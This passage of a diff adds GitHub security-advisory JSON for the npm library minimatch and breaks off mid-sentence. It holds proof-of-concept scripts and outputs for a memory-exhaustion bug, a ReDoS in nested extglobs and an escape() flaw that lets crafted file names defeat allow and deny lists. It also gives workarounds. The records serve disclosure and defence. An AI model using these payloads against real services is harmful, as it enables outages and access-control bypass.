leading '#' becomes a comment (windowsPathsNoEscape)\n    user input : \"#notes.md\"\n    options    : {\"windowsPathsNoEscape\":true}\n    pattern    : \"#notes.md\"\n    FAIL match(\"#notes.md\") expected=true actual=false\n\n[3] escaped backslash collapsed by a caller-added brace group\n    user input : \"x\\\\*\"\n    options    : {}\n    pattern    : \"x\\\\\\\\\\\\*.{js,ts}\"\n    ok   match(\"x\\\\*.js\") expected=true actual=true\n    FAIL match(\"x\\\\anything.js\") expected=false actual=true\n    braceExpand: [\"x\\\\\\\\*.js\",\"x\\\\\\\\*.ts\"]\n\n[3b] escaped backslash collapsed by a user-supplied brace group\n    user input : \"x\\\\*{,}\"\n    options    : {}\n    pattern    : \"x\\\\\\\\\\\\*{,}\"\n    FAIL match(\"x\\\\anything\") expected=false actual=true\n    braceExpand: [\"x\\\\\\\\*\",\"x\\\\\\\\*\"]\n\n[3c] control: same input, no brace group\n    user input : \"x\\\\*\"\n    options    : {}\n    pattern    : \"x\\\\\\\\\\\\*.js\"\n    ok   match(\"x\\\\*.js\") expected=true actual=true\n    ok   match(\"x\\\\anything.js\") expected=false actual=false\n\n[4] windowsPathsNoEscape + magicalBraces: class-wrapped braces expanded\n    user input : \"x{a,b}\"\n    options    : {\"windowsPathsNoEscape\":true,\"magicalBraces\":true}\n    pattern    : \"x[{]a,b[}]\"\n    FAIL match(\"x{a,b}\") expected=true actual=false\n    FAIL match(\"xa\") expected=false actual=true\n    braceExpand: [\"x[]a]\",\"x[b[]\"]\n\n[4b] same, with a caller-added brace group\n    user input : \"x{a,b}\"\n    options    : {\"windowsPathsNoEscape\":true,\"magicalBraces\":true}\n    pattern    : \"x[{]a,b[}].{js,ts}\"\n    FAIL match(\"x{a,b}.js\") expected=true actual=false\n    FAIL match(\"xa.js\") expected=false actual=true\n\n[P3] behavior 3 with every U+E000..U+F8FF character in the input\n    user input : \"x\\\\*<U+E000..U+F8FF>\"\n    options    : {}\n    pattern    : \"x\\\\\\\\\\\\*<U+E000..U+F8FF>.{js,ts}\"\n    ok   match(\"x\\\\*<U+E000..U+F8FF>.js\") expected=true actual=true\n    FAIL match(\"x\\\\ZZZ<U+E000..U+F8FF>.js\") expected=false actual=true\n\n[P4] behavior 4 with every U+E000..U+F8FF character in the input\n    user input : \"{q,b}<U+E000..U+F8FF>\"\n    options    : {\"windowsPathsNoEscape\":true,\"magicalBraces\":true}\n    pattern    : \"[{]q,b[}]<U+E000..U+F8FF>\"\n    FAIL match(\"{q,b}<U+E000..U+F8FF>\") expected=true actual=false\n    FAIL match(\"b<U+E000..U+F8FF>\") expected=false actual=true\n\n14 assertion(s) failed: escape() output did not match only the literal input.\n```\n\nNotes on the output:\n- In checks 1 and 1w, `!secret.txt` matches itself only because the negated pattern excludes `secret.txt`, not `!secret.txt`. `passwd` shows the negation.\n- The script has 11 numbered checks (1, 1w, 2, 2w, 3, 3b, 3c, 4, 4b, P3, P4). Each check makes one or more match assertions. The final line counts failed assertions, not checks: on 11.0.5, 14 assertions fail across 10 checks.\n- Check 3c is the control. The same escaped text without a brace group behaves correctly.\n- Checks P3 and P4 put every character from U+E000 to U+F8FF (6400 characters) into the user text. They exist to test fixes that pick sentinel characters from that range. On 11.0.5 they fail the same way as checks 3 and 4.\n\n### Impact\n\nThe impact depends on how the application uses the result. The precondition for every case is an application that passes user-controlled text through `escape()` and uses the resulting pattern for an access, filter, or exclusion decision. Each case below follows that pattern.\n\n1. **Leading `!`, allowlist.** A file-sharing feature builds an allow pattern per shared file: `allow.push(escape(fileName))`, then grants access when `minimatch(requestedPath, p)` is true for any `p`. A tenant uploads a file named `!a.txt` and shares it. The share grants access to every path except `a.txt`, including other files in the same scope. If the list is a denylist instead, the same file name blocks every other path.\n2. **Leading `#`, denylist or ignore list.** A backup or publish step excludes user-selected files: `exclude.push(escape(name))`. A file named `#secret#` (the Emacs autosave naming scheme) or `#notes.md` is never excluded and is uploaded or published. No error is reported.\n3. **Backslash plus brace group, allowlist.** An application allows a user-selected base name with known extensions: `escape(name) + '.{js,ts}'`. On POSIX, `\\` is a legal file name character. A user who can create a file named `x\\*` gets a pattern that matches any file in that directory whose name starts with `x\\` and ends in `.js` or `.ts`. With default options the application does not need to add a brace group: the name `x\\*{,}` alone gives a pattern that matches any name that starts with `x\\`. The over-match is limited to one path segment, to the user's chosen prefix, and to names that contain a literal backslash.\n4. **`windowsPathsNoEscape` + `magicalBraces`.** An application on Windows escapes names with both options so braces are literal. The name `report{draft,final}.docx` becomes `report[{]draft,final[}].docx`, which expands to `report[]draft].docx` and `report[final[].docx`. That pattern matches any name made of `report`, one character from `]draft` or `final[`, and `.docx` (for example `reportd.docx`, `reporta.docx`, `report].docx`, `report[.docx`). It does not match `report{draft,final}.docx`. For the input `{secret,b}` the pattern matches any one-character name from `]secret` or `b[` (for example `b`, `[`, `]`, `s`), and does not match `{secret,b}` or `secret`. A denylist entry silently fails to block the file. An allowlist entry admits unrelated names.\n\nThis is not remote code execution and not a denial of service. It is an integrity and confidentiality issue in security decisions that rely on `escape()`.\n\nWorkarounds until a fix ships (each measured on 11.0.5):\n- Behaviors 1 and 2: pass `{ nonegate: true, nocomment: true }` when matching escaped patterns. With `nonegate`, `escape('!secret.txt')` matches `!secret.txt` and not `passwd`. With `nocomment`, `escape('#notes.md')` matches `#notes.md`. This covers both modes.\n- Behavior 3: do not combine escaped text with a brace group, and use `{ magicalBraces: true }` so user braces are escaped. Passing `nobrace: true` stops the over-match (`x\\anything.js` no longer matches), but the caller's brace group then becomes literal: `x\\*.js` no longer matches either, and only `x\\*.{js,ts}` does. Expand the group in application code instead.\n- Behavior 4: pass `nobrace: true` when matching. With `{ windowsPathsNoEscape: true, magicalBraces: true, nobrace: true }`, `x[{]a,b[}]` matches `x{a,b}` and not `xa`. On POSIX, `{ magicalBraces: true }` without `windowsPathsNoEscape` gives `x\\{a,b\\}`, which matches only the literal. Dropping `magicalBraces` does not help: `escape('x{a,b}', { windowsPathsNoEscape: true })` returns `x{a,b}`, which matches `xa` and not the literal.",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "isaacs",
+        "id": 9287,
+        "node_id": "MDQ6VXNlcjkyODc=",
+        "avatar_url": "https://avatars.githubusercontent.com/u/9287?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/isaacs",
+        "html_url": "https://github.com/isaacs",
+        "followers_url": "https://api.github.com/users/isaacs/followers",
+        "following_url": "https://api.github.com/users/isaacs/following{/other_user}",
+        "gists_url": "https://api.github.com/users/isaacs/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/isaacs/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/isaacs/subscriptions",
+        "organizations_url": "https://api.github.com/users/isaacs/orgs",
+        "repos_url": "https://api.github.com/users/isaacs/repos",
+        "events_url": "https://api.github.com/users/isaacs/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/isaacs/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-c859-jr93-m5j4",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-11T09:51:30Z",
+      "published_at": "2026-11-11T09:51:30Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">= 7.4.0, <= 11.0.7",
+          "patched_versions": "11.0.8",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+          "score": 5.4
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-116",
+          "name": "Improper Encoding or Escaping of Output"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-116"
+      ],
+      "credits": [
+        {
+          "login": "agntflw",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "agntflw",
+            "id": 226981921,
+            "node_id": "U_kgDODYd4IQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/226981921?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/agntflw",
+            "html_url": "https://github.com/agntflw",
+            "followers_url": "https://api.github.com/users/agntflw/followers",
+            "following_url": "https://api.github.com/users/agntflw/following{/other_user}",
+            "gists_url": "https://api.github.com/users/agntflw/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/agntflw/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/agntflw/subscriptions",
+            "organizations_url": "https://api.github.com/users/agntflw/orgs",
+            "repos_url": "https://api.github.com/users/agntflw/repos",
+            "events_url": "https://api.github.com/users/agntflw/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/agntflw/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 1,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+        "score": 5.4
+      }
+    },
+    {
+      "ghsa_id": "GHSA-hqmv-qgp3-jx75",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/isaacs/minimatch/security-advisories/GHSA-hqmv-qgp3-jx75",
+      "html_url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-hqmv-qgp3-jx75",
+      "summary": "Global pattern cache retains large expansions, enabling memory exhaustion",
+      "description": "## Summary\r\n\r\nminimatch 11.0.3 through 11.0.7 retain the 256 most recent compiled `Minimatch` objects in a module-level cache. The cache is bounded only by entry count; each object can retain up to 100,000 expanded pattern rows. An application that passes untrusted, unique patterns to the top-level `minimatch()` function can therefore be terminated with a few very small inputs.\r\n\r\n## Root cause\r\n\r\nCommit `52d2aecceb71dae7f1b19675e74e044eb472c1e6` changed `minimatch()` to store each compiled object in a 256-entry `Map`. The key includes the complete pattern and options, so unique attacker-controlled patterns create distinct retained entries. There is no total cache-weight or per-entry expansion limit below the existing `braceExpandMax` default of 100,000.\r\n\r\nThe cache first ships in 11.0.3. Version 11.0.1 is a confirmed negative control.\r\n\r\n## Proof of concept\r\n\r\nInstall minimatch 11.0.4, save as `poc.mjs`, and run with `node --max-old-space-size=128 --expose-gc poc.mjs`:\r\n\r\n```js\r\nimport { minimatch } from 'minimatch'\r\n\r\nfor (let i = 0; i < 4; i++) {\r\n  const pattern = `{1..100000}/unique-${i}`\r\n  minimatch('no-match', pattern, { optimizationLevel: 2 })\r\n  global.gc()\r\n  console.log(i + 1, process.memoryUsage())\r\n}\r\n```\r\n\r\nOn 11.0.4, the process terminates with:\r\n\r\n```text\r\nFATAL ERROR: Ineffective mark-compacts near heap limit\r\nAllocation failed - JavaScript heap out of memory\r\n```\r\n\r\nThe same command exits normally on 11.0.1. With three calls and the normal heap limit, forced-GC heap grew from 4.36 MB to 112.27 MB and RSS from 50.9 MB to 262.7 MB.\r\n\r\nAs a smaller repeated control, ten independent processes each compiled ten unique 5,000-expansion patterns. On 11.0.4 the cached top-level function retained a median 17,371,504 heap bytes after forced GC. The direct `new Minimatch()` control retained 234,000 bytes, and the 11.0.1 top-level function showed no measurable retained-heap growth.\r\n\r\n## Impact\r\n\r\nApplications that accept attacker-controlled glob patterns and call the top-level `minimatch()` function can be crashed through memory exhaustion. Applications using only trusted patterns are not exposed. No confidentiality, integrity, filesystem, or code-execution impact is claimed.\r\n\r\nConfirmed affected: 11.0.3 through 11.0.7. No patched version is currently available.\r\n\r\n## Suggested remediation\r\n\r\nBound the cache by total retained weight or expansion count and do not cache large compiled patterns. Removing the global cache or making it opt-in for trusted patterns would also prevent the retention.\r\n\r\n## Duplicate review and disclosure\r\n\r\nPublic issues, pull requests, and advisories were searched for cache retention, OOM, `braceExpandMax`, and the 256-pattern cache. Issues #269 and #270 discuss caching performance but do not document this retention/OOM condition.\r\n\r\nOpenAI Codex assisted with source review, local reproduction, negative controls, version analysis, duplicate checks, and drafting. All tests were local; no external service was contacted. The account owner reviewed the evidence and explicitly authorized this private submission.",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "isaacs",
+        "id": 9287,
+        "node_id": "MDQ6VXNlcjkyODc=",
+        "avatar_url": "https://avatars.githubusercontent.com/u/9287?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/isaacs",
+        "html_url": "https://github.com/isaacs",
+        "followers_url": "https://api.github.com/users/isaacs/followers",
+        "following_url": "https://api.github.com/users/isaacs/following{/other_user}",
+        "gists_url": "https://api.github.com/users/isaacs/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/isaacs/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/isaacs/subscriptions",
+        "organizations_url": "https://api.github.com/users/isaacs/orgs",
+        "repos_url": "https://api.github.com/users/isaacs/repos",
+        "events_url": "https://api.github.com/users/isaacs/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/isaacs/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-hqmv-qgp3-jx75",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-11T09:50:24Z",
+      "published_at": "2026-11-11T09:50:24Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "minimatch"
+          },
+          "vulnerable_version_range": ">= 11.0.3, <= 11.0.7",
+          "patched_versions": "11.0.8",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 5.9
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-400"
+      ],
+      "credits": [
+        {
+          "login": "jankesec",
+          "type": "reporter"
+        },
+        {
+          "login": "agntflw",
+          "type": "reporter"
+        },
+        {
+          "login": "assakafpix",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "jankesec",
+            "id": 295349953,
+            "node_id": "U_kgDOEZquwQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/295349953?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/jankesec",
+            "html_url": "https://github.com/jankesec",
+            "followers_url": "https://api.github.com/users/jankesec/followers",
+            "following_url": "https://api.github.com/users/jankesec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/jankesec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/jankesec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/jankesec/subscriptions",
+            "organizations_url": "https://api.github.com/users/jankesec/orgs",
+            "repos_url": "https://api.github.com/users/jankesec/repos",
+            "events_url": "https://api.github.com/users/jankesec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/jankesec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        },
+        {
+          "user": {
+            "login": "agntflw",
+            "id": 226981921,
+            "node_id": "U_kgDODYd4IQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/226981921?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/agntflw",
+            "html_url": "https://github.com/agntflw",
+            "followers_url": "https://api.github.com/users/agntflw/followers",
+            "following_url": "https://api.github.com/users/agntflw/following{/other_user}",
+            "gists_url": "https://api.github.com/users/agntflw/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/agntflw/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/agntflw/subscriptions",
+            "organizations_url": "https://api.github.com/users/agntflw/orgs",
+            "repos_url": "https://api.github.com/users/agntflw/repos",
+            "events_url": "https://api.github.com/users/agntflw/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/agntflw/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        },
+        {
+          "user": {
+            "login": "assakafpix",
+            "id": 212399165,
+            "node_id": "U_kgDODKj0PQ",
+            "avatar_url": "https://avatars.githubusercontent.com/u/212399165?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/assakafpix",
+            "html_url": "https://github.com/assakafpix",
+            "followers_url": "https://api.github.com/users/assakafpix/followers",
+            "following_url": "https://api.github.com/users/assakafpix/following{/other_user}",
+            "gists_url": "https://api.github.com/users/assakafpix/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/assakafpix/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/assakafpix/subscriptions",
+            "organizations_url": "https://api.github.com/users/assakafpix/orgs",
+            "repos_url": "https://api.github.com/users/assakafpix/repos",
+            "events_url": "https://api.github.com/users/assakafpix/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/assakafpix/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 3,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 5.9
+      }
+    },
+    {
+      "ghsa_id": "GHSA-g3hv-75wg-m249",
+      "cve_id": "CVE-2026-118764",
+      "url": "https://api.github.com/repos/isaacs/minimatch/security-advisories/GHSA-g3hv-75wg-m249",
+      "html_url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249",
+      "summary": "denial of service via globparts amplification",
+      "description": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.\r\n\r\nresearcher: Reid Downing (b1nv0id)\r\nfiles: \r\nsrc/index.ts: 690-770\r\nsrc/index.ts: 780-796\r\nissue:\r\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\r\n\r\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\r\n\r\nparts.splice(gs, 1)\r\nconst other = parts.slice(0)\r\nother[gs] = '**'\r\nglobParts.push(other)\r\n\r\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\r\n\r\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\r\n\r\nfor (let i = 0; i < globParts.length - 1; i++) {\r\n  for (let j = i + 1; j < globParts.length; j++) {\r\n    this.partsMatch(...)\r\n  }\r\n}\r\n\r\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "isaacs",
+        "id": 9287,
+        "node_id": "MDQ6VXNlcjkyODc=",
+        "avatar_url": "https://avatars.githubusercontent.com/u/9287?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/isaacs",
+        "html_url": "https://github.com/isaacs",
+        "followers_url": "https://api.github.com/users/isaacs/followers",
+        "following_url": "https://api.github.com/users/isaacs/following{/other_user}",
+        "gists_url": "https://api.github.com/users/isaacs/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/isaacs/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/isaacs/subscriptions",
+        "organizations_url": "https://api.github.com/users/isaacs/orgs",
+        "repos_url": "https://api.github.com/users/isaacs/repos",
+        "events_url": "https://api.github.com/users/isaacs/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/isaacs/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-g3hv-75wg-m249",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-118764",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-29T17:05:52Z",
+      "published_at": "2026-10-27T22:23:27Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "",
+            "name": ""
+          },
+          "vulnerable_version_range": "10.2.6",
+          "patched_versions": "11.0.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [],
+      "cwe_ids": [],
+      "credits": [
+        {
+          "login": "b1nv0id",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "b1nv0id",
+            "id": 194707351,
+            "node_id": "U_kgDOC5r_lw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/194707351?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/b1nv0id",
+            "html_url": "https://github.com/b1nv0id",
+            "followers_url": "https://api.github.com/users/b1nv0id/followers",
+            "following_url": "https://api.github.com/users/b1nv0id/following{/other_user}",
+            "gists_url": "https://api.github.com/users/b1nv0id/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/b1nv0id/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/b1nv0id/subscriptions",
+            "organizations_url": "https://api.github.com/users/b1nv0id/orgs",
+            "repos_url": "https://api.github.com/users/b1nv0id/repos",
+            "events_url": "https://api.github.com/users/b1nv0id/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/b1nv0id/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 2,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-23c5-xmqv-rm74",
+      "cve_id": "CVE-2026-27904",
+      "url": "https://api.github.com/repos/isaacs/minimatch/security-advisories/GHSA-23c5-xmqv-rm74",
+      "html_url": "https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74",
+      "summary": "ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions",
+      "description": "### Summary\r\n\r\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\r\n\r\n---\r\n\r\n### Details\r\n\r\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\r\n\r\n```typescript\r\n: this.type === '*' && bodyDotAllowed ? `)?`\r\n: `)${this.type}`\r\n```\r\n\r\nThis produces the following regexps:\r\n\r\n| Pattern              | Generated regex                          |\r\n|----------------------|------------------------------------------|\r\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\r\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\r\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\r\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\r\n\r\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\r\n\r\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\r\n\r\nMeasured times via `minimatch()`:\r\n\r\n| Pattern              | Input              | Time       |\r\n|----------------------|--------------------|------------|\r\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\r\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\r\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\r\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\r\n\r\nDepth inflection at fixed input `a` x16 + `z`:\r\n\r\n| Depth | Pattern              | Time         |\r\n|-------|----------------------|--------------|\r\n| 1     | `*(a\\|b)`            | 0ms          |\r\n| 2     | `*(*(a\\|b))`         | 4ms          |\r\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\r\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\r\n\r\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\r\n\r\n---\r\n\r\n### PoC\r\n\r\nTested on minimatch@10.2.2, Node.js 20.\r\n\r\n**Step 1 -- verify the generated regexps and timing (standalone script)**\r\n\r\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\r\n\r\n```javascript\r\nimport { minimatch, Minimatch } from 'minimatch'\r\n\r\nfunction timed(fn) {\r\n  const s = process.hrtime.bigint()\r\n  let result, error\r\n  try { result = fn() } catch(e) { error = e }\r\n  const ms = Number(process.hrtime.bigint() - s) / 1e6\r\n  return { ms, result, error }\r\n}\r\n\r\n// Verify generated regexps\r\nfor (let depth = 1; depth <= 4; depth++) {\r\n  let pat = 'a|b'\r\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\r\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\r\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\r\n}\r\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\r\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\r\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\r\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\r\n\r\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\r\nconst cases = [\r\n  ['*(*(*(a|b)))', 15],   // ~270ms\r\n  ['*(*(*(a|b)))', 17],   // ~800ms\r\n  ['*(*(*(a|b)))', 19],   // ~2400ms\r\n  ['*(*(a|b))',    23],   // ~260ms\r\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\r\n]\r\nfor (const [pat, n] of cases) {\r\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\r\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\r\n}\r\n\r\n// Confirm noext disables the vulnerability\r\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\r\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\r\n\r\n// +() is equally affected\r\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\r\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\r\n```\r\n\r\nObserved output:\r\n```\r\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\r\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\r\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\r\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\r\n\"*(*(*(a|b)))\" n=15: 269ms result=false\r\n\"*(*(*(a|b)))\" n=17: 268ms result=false\r\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\r\n\"*(*(a|b))\"    n=23: 257ms result=false\r\n\"*(a|b)\"       n=101: 0ms result=false\r\nnoext=true: 0ms (should be ~0ms)\r\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\r\n```\r\n\r\n**Step 2 -- HTTP server (event loop starvation proof)**\r\n\r\nSave as `poc4-server.mjs`:\r\n\r\n```javascript\r\nimport http from 'node:http'\r\nimport { URL } from 'node:url'\r\nimport { minimatch } from 'minimatch'\r\n\r\nconst PORT = 3001\r\nhttp.createServer((req, res) => {\r\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\r\n  const pattern = url.searchParams.get('pattern') ?? ''\r\n  const path    = url.searchParams.get('path') ?? ''\r\n\r\n  const start  = process.hrtime.bigint()\r\n  const result = minimatch(path, pattern)\r\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\r\n\r\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\r\n  res.writeHead(200, { 'Content-Type': 'application/json' })\r\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\r\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\r\n```\r\n\r\nTerminal 1 -- start the server:\r\n```\r\nnode poc4-server.mjs\r\n```\r\n\r\nTerminal 2 -- fire the attack (depth=3, 